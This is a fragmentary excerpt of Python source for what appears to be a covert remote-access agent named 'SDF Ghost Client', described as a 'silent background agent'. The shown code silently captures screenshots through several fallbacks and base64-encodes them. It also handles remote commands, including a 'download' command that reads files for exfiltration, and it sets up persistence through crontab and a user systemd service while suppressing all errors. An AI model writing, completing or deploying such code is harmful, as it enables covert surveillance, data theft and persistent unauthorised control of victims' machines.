...
"""
SDF Ghost Client - Complete Silent Background Agent (FIXED)
...
# ==============================================================================
# SCREEN CAPTURE - FIXED WITH FALLBACKS
# ==============================================================================
        ...
        try:
            ...
            if HAS_MSS:
                try:
                    ...
                    with mss.mss() as sct:
                        ...
                        buffered = io.BytesIO()
                        Image.frombytes('RGB', (img.width, img.height), img.rgb).save(buffered, format="JPEG", quality=60)
                        return base64.b64encode(buffered.getvalue()).decode()
                except:
                    pass
            ...
            if platform.system() == 'Linux':
                try:
                    ...
                    result = subprocess.run(['scrot', '-q', '60', tmp.name], capture_output=True)
                    ...
                    result = subprocess.run(['import', '-window', 'root', tmp.name], capture_output=True)
                    if result.returncode == 0:
                        with open(tmp.name, 'rb') as f:
                            data = base64.b64encode(f.read()).decode()
                        os.unlink(tmp.name)
    ...
    def execute(cmd):
        try:
            ...
            if cmd.startswith('download '):
                try:
                    path = cmd[9:].strip()
                    data = FileOps.read_file_b64(path)
                    if data:
                        return {'type': 'file_download', 'data': data, 'path': path}
                    return {'type': 'error', 'data': 'File not found'}
                except:
                    return {'type': 'error', 'data': 'Download failed'}
            ...
            return {'type': 'cmd_result', 'output': f'Command failed: {str(e)}'}
...
'''
            ...
            try:
                ...
                subprocess.run(['crontab', str(cron_file)], capture_output=True)
                cron_file.unlink()
            except:
                pass
...
'''
            ...
            try:
                ...
                subprocess.run(['systemctl', '--user', 'enable', f'{TASK_NAME}.service'], capture_output=True)
                subprocess.run(['systemctl', '--user', 'start', f'{TASK_NAME}.service'], capture_output=True)
            except:
                pass
    except:
        pass
